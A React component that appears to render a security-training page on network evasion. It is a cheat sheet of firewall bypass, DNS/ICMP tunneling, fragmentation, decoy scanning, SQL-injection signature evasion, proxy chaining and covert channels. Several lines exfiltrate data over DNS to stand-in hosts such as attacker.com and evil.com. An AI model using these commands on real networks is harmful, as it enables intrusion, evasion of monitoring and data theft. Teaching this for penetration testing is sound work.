
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Network, Shield, Globe, Zap } from 'lucide-react';

const NetworkEvasion: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Network className="h-6 w-6" />
          Network-Level Evasion
        </CardTitle>
      </CardHeader>
      <CardContent>
        <Tabs defaultValue="firewall-bypass" className="w-full">
          <TabsList className="grid grid-cols-2 md:grid-cols-4 w-full mb-6">
            <TabsTrigger value="firewall-bypass">Firewall Bypass</TabsTrigger>
            <TabsTrigger value="ids-evasion">IDS Evasion</TabsTrigger>
            <TabsTrigger value="proxy-tunneling">Proxy Tunneling</TabsTrigger>
            <TabsTrigger value="traffic-shaping">Traffic Shaping</TabsTrigger>
          </TabsList>

          <TabsContent value="firewall-bypass" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Firewall Bypass Techniques</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Port Knocking</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Nmap Port Knocking
nmap -r -p 1001,1002,1003 target.com
sleep 2
nmap -p 22 target.com

# Hping3 Port Knocking
hping3 -S -p 1001 target.com -c 1
hping3 -S -p 1002 target.com -c 1  
hping3 -S -p 1003 target.com -c 1
hping3 -S -p 22 target.com -c 1

# Knock Script
#!/bin/bash
HOST=$1
shift
for i in $@; do
    nmap -Pn --max-retries 0 -p $i $HOST
done`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Protocol Tunneling</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# DNS Tunneling
# Using dnscat2
./dnscat2-server example.com
./dnscat2-client example.com

# Using iodine
iodined -f -c -P password 10.0.0.1 tunnel.example.com
iodine -f -P password tunnel.example.com

# ICMP Tunneling
# Using ptunnel
ptunnel -p proxy.com -lp 8000 -da destination.com -dp 22
ssh -p 8000 localhost

# HTTP Tunneling
# Using HTTPTunnel
hts --forward-port localhost:8080 80
htc --forward-port 8080 proxy.com:80`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Fragmentation Attacks</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Nmap Fragmentation
nmap -f target.com  # 8-byte fragments
nmap -ff target.com # 16-byte fragments
nmap --mtu 24 target.com # Custom MTU

# Hping3 Fragmentation
hping3 -f -p 80 target.com
hping3 -f -s 1000 -p 80 target.com

# Scapy Fragmentation
from scapy.all import *

packet = IP(dst="target.com")/TCP(dport=80)
fragments = fragment(packet, fragsize=8)
for frag in fragments:
    send(frag)`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="ids-evasion" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">IDS/IPS Evasion</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Timing-Based Evasion</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Slow Scan Techniques
nmap -T0 target.com  # Paranoid timing
nmap -T1 target.com  # Sneaky timing
nmap --scan-delay 5s target.com

# Random Delays
nmap --randomize-hosts target1.com target2.com target3.com
nmap --max-rate 1 target.com

# Custom Timing Script
#!/bin/bash
for port in {1..1000}; do
    timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null &&
    echo "Port $port is open"
    sleep $(shuf -i 1-10 -n 1)
done`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Decoy Scanning</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Nmap Decoys
nmap -D RND:10 target.com  # 10 random decoys
nmap -D decoy1,decoy2,ME,decoy3 target.com
nmap -D 192.168.1.5,192.168.1.6,ME target.com

# Hping3 Decoys
hping3 -a decoy_ip -S -p 80 target.com

# Scapy Decoy Implementation
from scapy.all import *
import random

def decoy_scan(target, port, num_decoys=5):
    decoys = []
    for i in range(num_decoys):
        decoy_ip = ".".join([str(random.randint(1,254)) for _ in range(4)])
        decoys.append(decoy_ip)
    
    for decoy in decoys:
        send(IP(src=decoy, dst=target)/TCP(dport=port, flags="S"))
    
    # Real scan
    send(IP(dst=target)/TCP(dport=port, flags="S"))`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Signature Evasion</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# HTTP Request Obfuscation
GET /index.php?id=1%27%20UNION%20SELECT%201,2,3-- HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)

# Case Variation
GeT /INDEX.PHP?ID=1%27%20uNiOn%20sElEcT%201,2,3-- HTTP/1.1

# Header Injection
GET /index.php HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Real-IP: 192.168.1.1
X-Custom-Header: ?id=1' UNION SELECT 1,2,3--

# Protocol Violation
GET /index.php?id=1' UNION/**/SELECT/**/1,2,3-- HTTP/1.1\\r\\n\\r\\n
Host: target.com\\r\\n\\r\\n`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="proxy-tunneling" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Proxy & Tunneling</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">SOCKS Proxying</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# SSH Dynamic Port Forwarding
ssh -D 8080 user@proxy-server.com
proxychains nmap -sT target.com

# SOCKS5 with Authentication
ssh -o "ProxyCommand=nc -X 5 -x proxy:1080 %h %p" user@target.com

# Proxychains Configuration
echo "socks5 127.0.0.1 8080" >> /etc/proxychains.conf
proxychains curl http://target.com

# Python SOCKS Proxy
import socks
import socket

socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8080)
socket.socket = socks.socksocket`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">HTTP Proxy Chains</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Multiple Proxy Chain
proxychains4 -f proxy_chain.conf nmap target.com

# proxy_chain.conf
[ProxyList]
http proxy1.com 8080
http proxy2.com 3128
socks5 proxy3.com 1080

# Tor + HTTP Proxy
tor &
privoxy --config-file privoxy.conf &
curl --proxy 127.0.0.1:8118 http://target.com

# Burp Upstream Proxy Chain
# Configure Burp -> Proxy -> Options -> Upstream Proxy Servers`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">DNS over HTTPS/TLS</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# DNS over HTTPS
dig @1.1.1.1 target.com
curl -H "accept: application/dns-json" "https://1.1.1.1/dns-query?name=target.com&type=A"

# DNS over TLS
kdig -d @1.1.1.1 +tls-ca target.com

# Encrypted DNS Configuration
# /etc/systemd/resolved.conf
[Resolve]
DNS=1.1.1.1#cloudflare-dns.com
DNSOverTLS=yes

# DNS Tunneling Detection Bypass
# Use legitimate DNS servers as relays
dig @8.8.8.8 tunnel-data.attacker.com TXT
dig @208.67.222.222 exfil-data.evil.com A`}
                </pre>
              </div>
            </div>
          </TabsContent>

          <TabsContent value="traffic-shaping" className="space-y-6">
            <div className="space-y-4">
              <h3 className="text-xl font-semibold text-cybr-primary">Traffic Shaping & Mimicry</h3>
              
              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Protocol Mimicry</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# HTTP/HTTPS Traffic Mimicry
# Disguise payload as legitimate web traffic
curl -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \\
     -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \\
     -H "Accept-Language: en-US,en;q=0.5" \\
     -H "Accept-Encoding: gzip, deflate" \\
     -H "DNT: 1" \\
     -H "Connection: keep-alive" \\
     http://target.com/search?q=base64encodedpayload

# FTP Traffic Mimicry
echo "USER anonymous" | nc target.com 21
echo "PASS guest@" | nc target.com 21
echo "STOR payload.txt" | nc target.com 21

# Email Traffic Mimicry
telnet mail.target.com 25
EHLO target.com
MAIL FROM: <user@target.com>
RCPT TO: <admin@target.com>
DATA
Subject: System Update
base64encodedpayload
.`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Bandwidth Throttling</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# Limit Transfer Rate
wget --limit-rate=1k http://target.com/largefile.zip
curl --limit-rate 1K http://target.com/data

# Python Rate Limiting
import time
import requests

def slow_request(url, delay=1):
    response = requests.get(url, stream=True)
    for chunk in response.iter_content(chunk_size=1024):
        if chunk:
            time.sleep(delay)
            yield chunk

# Traffic Shaping with tc (Linux)
tc qdisc add dev eth0 root handle 1: htb default 12
tc class add dev eth0 parent 1:1 classid 1:12 htb rate 56kbps ceil 128kbps
tc filter add dev eth0 parent 1:0 protocol ip u32 match ip dst target.com/32 flowid 1:12`}
                </pre>
              </div>

              <div className="bg-cybr-muted/20 p-4 rounded-lg">
                <h4 className="font-medium text-cybr-accent mb-2">Covert Channels</h4>
                <pre className="bg-cybr-background p-3 rounded text-sm overflow-x-auto">
{`# ICMP Covert Channel
# Sender
ping -p $(echo "secret data" | xxd -p) target.com

# Receiver
tcpdump -i eth0 icmp and host target.com -X

# TCP Sequence Number Covert Channel
hping3 -S -p 80 -M $(echo "data" | od -A n -t u1) target.com

# DNS TXT Record Covert Channel
dig $(echo "exfiltrated data" | base64).covert.attacker.com TXT

# HTTP Cookie Covert Channel
curl -b "sessionid=$(echo 'secret' | base64)" http://target.com
curl -H "Cookie: data=$(echo 'payload' | base64)" http://target.com`}
                </pre>
              </div>
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default NetworkEvasion;
